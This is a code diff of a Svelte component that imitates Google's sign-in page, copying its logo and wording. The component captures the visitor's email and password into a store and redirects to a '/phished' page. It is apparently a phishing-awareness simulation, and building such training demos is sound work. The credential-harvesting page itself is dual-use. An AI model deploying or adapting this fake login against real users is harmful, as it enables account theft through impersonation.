@@ -1,5 +1,9 @@
 <script lang="ts">
+	import { goto } from '$app/navigation';
+	import { tick } from 'svelte';
 	import url from './google.jpg';
+	import { fade, fly } from 'svelte/transition';
+	import { phishInfo } from '$lib/stores';
 
 	let state: 'email' | 'password' | 'phished' = 'email';
 
@@ -8,7 +12,7 @@
 	let passwordElement: HTMLInputElement | null = null;
 	let emailName: string = 'Student';
 
-	let passoword: string | null = null;
+	let password: string | null = null;
 
 	$: {
 		if (email) {
@@ -16,90 +20,99 @@
 		}
 	}
 
-	function stateToPassword() {
+	async function stateToPassword() {
 		email = emailElement?.value ?? null;
 		state = 'password';
+		await tick();
+		passwordElement?.focus();
 	}
 
 	function stateToPhished() {
-		passoword = passwordElement?.value ?? null;
+		password = passwordElement?.value ?? null;
 		state = 'phished';
+		if (!email || !password) return;
+		$phishInfo = { email, password };
+		goto('/phished');
 	}
 </script>
 
 <div class="verify">
-	<img src={url} alt="Google logo" />
-	{#if state == 'email'}
-		<div class="title">
-			<h1>Sign in</h1>
-			<p>Use your Google Account</p>
-		</div>
-
-		<div class="inputs">
-			<input
-				type="text"
-				placeholder="Email or phone"
-				bind:this={emailElement}
-				on:keydown={(e) => {
-					if (e.key == 'Enter') {
-						stateToPassword();
-					}
-				}}
-			/>
-			<a href="./">Forgot email?</a>
-		</div>
-
-		<p class="guestmode">
-			Not your computer? Use Guest mode to sign in privately.
-			<a href="./">Learn more</a>
-		</p>
-
-		<div class="buttons">
-			<button class="weak">Create account</button>
-			<button on:click={stateToPassword}>Next</button>
-		</div>
-	{:else if state == 'password'}
-		<div class="title">
-			<h1>Hi {emailName}</h1>
-			<div class="pocket">
-				<div class="profile" />
-				<div>
-					{email}
+	{#key state}
+		<div
+			class="content"
+			in:fly={{ x: 200, duration: 500, delay: 500 }}
+			out:fly={{ x: -200, duration: 500 }}
+		>
+			<img src={url} alt="Google logo" />
+			{#if state == 'email'}
+				<div class="title">
+					<h1>Sign in</h1>
+					<p>Use your Google Account</p>
 				</div>
-			</div>
-		</div>
 
-		<div class="inputs">
-			<input
-				type="password"
-				placeholder="Enter your password"
-				on:keydown={(e) => {
-					if (e.key == 'Enter') {
-						stateToPhished();
-					}
-				}}
-			/>
-			<label>
-				<input type="checkbox" /> Show password
-			</label>
-		</div>
+				<div class="inputs">
+					<input
+						type="text"
+						placeholder="Email or phone"
+						bind:this={emailElement}
+						on:keydown={(e) => {
+							if (e.key == 'Enter') {
+								stateToPassword();
+							}
+						}}
+					/>
+					<a href="./">Forgot email?</a>
+				</div>
 
-		<div class="buttons">
-			<button class="weak">Forgot password?</button>
-			<button on:click={stateToPhished}>Next</button>
+				<p class="guestmode">
+					Not your computer? Use Guest mode to sign in privately.
+					<a href="./">Learn more</a>
+				</p>
+
+				<div class="buttons">
+					<button class="weak">Create account</button>
+					<button on:click={stateToPassword}>Next</button>
+				</div>
+			{:else if state == 'password'}
+				<div class="title">
+					<h1>Hi {emailName}</h1>
+					<div class="pocket">
+						<div class="profile" />
+						<div>
+							{email}
+						</div>
+					</div>
+				</div>
+
+				<div class="inputs">
+					<input
+						bind:this={passwordElement}
+						type="password"
+						placeholder="Enter your password"
+						on:keydown={(e) => {
+							if (e.key == 'Enter') {
+								stateToPhished();
+							}
+						}}
+					/>
+					<label>
+						<input type="checkbox" /> Show password
+					</label>
+				</div>
+
+				<div class="buttons">
+					<button class="weak">Forgot password?</button>
+					<button on:click={stateToPhished}>Next</button>
+				</div>
+			{/if}
 		</div>
-	{/if}
+	{/key}
 </div>
 
 <style>
 	@import '@fontsource/noto-sans';
 
 	.verify {
-		display: flex;
-		flex-direction: column;
-		align-items: center;
-		justify-content: center;
-		gap: 20px;
 		max-width: 500px;
 		--border: #dadee3;
 		--button: rgb(26, 115, 232);
@@ -111,9 +124,25 @@
 		background: white;
 		border: 1px solid var(--border);
 		border-radius: 8px;
-		padding: 48px 40px 80px;
 		width: 400px;
+		height: 500px;
+		position: relative;
+
+		overflow: hidden;
+	}
+
+	.content {
 		box-sizing: border-box;
+		padding: 48px 40px 80px;
+
+		width: 100%;
+		height: auto;
+		display: flex;
+		gap: 20px;
+		flex-direction: column;
+		align-items: center;
+		justify-content: center;
+		position: absolute;
 	}
 
 	img {
